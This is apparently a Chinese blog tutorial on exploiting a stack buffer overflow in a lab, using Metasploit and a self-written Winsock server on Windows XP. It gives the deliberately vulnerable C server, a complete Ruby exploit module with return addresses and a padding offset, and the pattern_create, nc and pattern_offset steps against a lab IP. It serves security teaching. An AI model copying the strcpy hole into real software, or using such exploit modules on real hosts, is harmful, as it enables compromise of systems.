---
title: 使用MSF发布POC
date: 2017-06-21 09:44:47
categories: 安全工具
tags: metasploit
---

### 1、开始之前

其实Metasploit一直是我想学习的安全工具，但是由于其功能实在太强大了，如果没有基础就开始使用，难免会有点因噎废食的感觉，所以我在学习《0day安全 软件漏洞分析技术》的过程中，做了些许CTF的逆向题，看了不少该类型题的writeup，最后才开始我的Metasploit学习之旅。

### 2、环境要求


|          		| 推荐使用环境           | 备注  |
| ------------- |:-------------|: -----:|
| 攻击者操作系统       | Kali2.0		 | Kali主机上装有MSF，免去我们重新安装MSF的步骤 |
| 靶机操作系统     | Win XP SP3      | 其他的windows操作系统也可以使用，但是exploit覆盖的函数返回地址会发生改变 |
| 靶机编辑器 | Visual C++ 6.0      |  其他编辑器生成的PE文件也可以用于本实验，但是实验细节会发生改变 |
|编译选项	|	默认编译选项 |	|
|build版本  |  debug	|	release版本也可以用于本实验，但是实验细节会发生改变 |

### 3、windows主机上存在漏洞的Server程序

	#include "iostream"
    #include "winsock2.h"
    #pragma comment(lib, "ws2_32.lib")

    using namespace std;

    void msg_display(char* buf)
    {
        char msg[200];
        strcpy(msg, buf);		//overflow here, copy 0x200 to 200
        cout<<"*****************************"<<endl;
        cout<<"received:"<<endl;
        cout<<msg<<endl;
    }

    void main()
    {
        int sock, msgsock, length, receive_len;
        struct sockaddr_in sock_server, sock_client;
        char buf[0x200];		// noticed it is 0x200

        WSADATA wsa;
        WSAStartup(MAKEWORD(1,1), &wsa);
        if((sock=socket(AF_INET, SOCK_STREAM, 0))<0)
        {
            cout<<sock<<"sock creating error!"<<endl;
            exit(1);
        }
        sock_server.sin_family=AF_INET;
        sock_server.sin_port=htons(7777);
        sock_server.sin_addr.s_addr=htonl(INADDR_ANY);
        if(bind(sock, (struct sockaddr*)&sock_server, sizeof(sock_server)))
        {
            cout<<"binding target server 1.0         "<<endl;
        }
        cout<<"*****************************************************"<<endl;
        cout<<"                exploit target server 1.0          "<<endl;
        cout<<"*****************************************************"<<endl;
        listen(sock, 4);
        length = sizeof(struct sockaddr);
        do{
            msgsock = accept(sock, (struct sockaddr*)&sock_client, (int *)&length);
            if(msgsock==-1)
            {
                cout<<"accept error!"<<endl;
                break;
            }
            else
                do
                {
                    memset(buf, 0, sizeof(buf));
                    if((receive_len=recv(msgsock, buf, sizeof(buf), 0))<0)
                    {
                        cout<<"reading stream message error!"<<endl;
                        receive_len = 0;
                    }
                    msg_display(buf);		//trigged the overflow
                }while(receive_len);
                closesocket(msgsock);
        }while(1);
        WSACleanup();
    }

### 4、开发exploit

#### 4.1 Ruby开发exploit的正常结构

	class xxx

         def initialize
         #定义模块初始化信息。如漏洞使用的操作系统平台、为不同操作系统指明不同的返回地址
         #指明shellcode中禁止出现的特殊字符、漏洞相关的描述、URL引用、作者信息等
         end

         def exploit
         #将填充物、返回地址、shellcode等组织成最终的attack_buffer，并发送
         end

    end

#### 4.2 Ruby开发“傻瓜式”Exploit

	#!/usr/bin/env ruby
    require 'msf/core'      # it is similar to 'include' in C language
    class Metasploit3 < Msf::Exploit::Remote
        include Msf::Exploit::Remote::Tcp
        def initialize(info = {})
            super(update_info(info,
                'Name'=>'failwest_test',
                'Platform'=>'win',
                'Targets' => [
                    [ 'Windows 2000',{ 'Ret' => 0x77F8948B } ],
                    [ 'Windwos xp sp2',{ 'Ret' => 0x7C914393 } ],
                    [ 'Windwos xp sp3',{ 'Ret' => 0x7c86467b} ],
                    ],
                'Payload' => {
                    'Space' => 300,
                    'BadChars' => '\x00',
                    'StackAdjustment' => -3500,
                    }))
        end

        def exploit
            connect
            attack_buf = 'a'*204 + [target['Ret']].pack('V') + payload.encoded
            sock.put(attack_buf)
            handler
            disconnect
        end

    end

require指明所需的类库，相当于C语言中的include。所有的MSF模块都需要这句话。
运算符"<"在这里表示继承，也就是说，我们所定义的类是由Msf::Exploit::Remote继承而来，可以方便地使用父类的资源。

在类中只定义了两个方法（函数），一是initialize，另一个是exploit。
可见为MSF开发模块的过程其实就是实现这两个方法的过程。
initialize方法的实现非常简单，在某种意义上更像是在“填空”。从代码中可以看到，initialize实际上值调用了一个方法update_info来初始化info数据结构。初始化的过程通过一系列hash操作完成。
(1) Name模块的名称，MSF通过这个名称来引用本模块
(2) Platform模块运行平台，MSF通过这个值来为exploit挑选payload。本例中，该值为"win"，所以MSF只选用windows平台的payload，BSD和Linux的payload将被禁用。
(3) Targets可以定义多种操作系统版本中的返回地址，本例中定义了Windows2000、Windows XP SP2、Windows XP SP3三种，跳转指令选用了jmp esp，均来自kernel32.dll。本实验时您可能需要根据实验环境重新确定这个值。
(4) Payload对shellcode的要求，如大小和禁止使用的字节等。由于漏洞函数使用strcpy函数，故字符结束符0x00应该被禁用。MSF会根据这里的设置自动选用编码算法对shellcode进行加工以满足测试要求。

exploit的定义各位简单。
需要说明的只有     attack_buf = 'a'*204 + [target['Ret']].pack('V') + payload.encoded
首先选用204个字母'a'填充缓冲区。
pack('V')的作用时把数据按照DWORD逆序。
填充了缓冲区和返回地址后，再选上经过编码的shellcode，就得到最终的attack_buf。其中，payload.encoded会在使用时由MSF提示我们手工设置并生成。

#### <font color=#f00>4.3 获取返回地址和覆盖返回地址</font>

一眼望去，我们仿佛就知道覆盖的函数返回地址是在第200个字节之后，但这是不对的。对于书上给出的exploit，attack_buf = 'a'*200 + [target['Ret']].pack('V') + payload.encoded，但是实验结果并不能复现，所以我们猜测要么是返回地址弄错了，要么就是没有真正覆盖返回地址。

##### 获取返回地址：
（1）将windows XP sp3中的kernel32.dll(c:\windows\system32\kernel32.dll)拷贝至kali(/root/Desktop/kernel32.dll)系统
（2）使用msfpescan查看jmp esp所在的地址。

![获取kernel32.dll的jmp esp地址](/images/2017-06-21/kernel32_jesp.jpg)

从图中可以看出jmp esp所在的地址就是0x7c86467b

##### 覆盖返回地址
如何发现覆盖的是否是返回地址，就需要对地址一个调试工具了。
这里可以使用windbg，也可以使用OllyDbg，为了方便就使用windbg。

（1）首先在windows xp sp2用windbg打开Server服务程序，启动7777端口。
（2）在Kali 2.0上生成有序的定长字符串，这儿使用的是msf的工具pattern_create

	# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1000 > /root/Desktop/hi.txt

（3）在Kali 2.0上连接Windows xp sp2(ip地址为192.168.124.132)上的Server服务器

	# cat /root/Desktop/hi.txt | nc 192.168.124.132 7777

（4）在windows xp sp2上查看被覆盖的地址，可以从eip上查看

![覆盖的返回地址](/images/2017-06-21/cover_addr.jpg)

（5）在Kali 2.0上使用msf工具pattern_offset获取地址偏移

![获取偏移地址](/images/2017-06-21/offset.jpg)

所以最终可以确定，当字符串长度大于204个字节的时候，从第204个字节开始，后4个字节覆盖了该函数的返回地址

##### 综合编写exploit
综合上述找到的返回地址以及覆盖返回地址时前面需要字符串长度，最后可以得到以下几个部分:

	'Targets' => [
                    [ 'Windows 2000',{ 'Ret' => 0x77F8948B } ],
                    [ 'Windwos xp sp2',{ 'Ret' => 0x7C914393 } ],
                    [ 'Windwos xp sp3',{ 'Ret' => 0x7c86467b} ],
                    ],


    attack_buf = 'a'*204 + [target['Ret']].pack('V') + payload.encoded


### 5、测试结果

![实验测试结果](/images/2017-06-21/test_result.jpg)


### 参考文献
[《0day安全 软件漏洞分析技术》](http://pan.baidu.com/s/1jIPzHlG)
[2012西电网络攻防大赛 溢出第三题 调试笔记](http://www.2cto.com/article/201308/234430.html)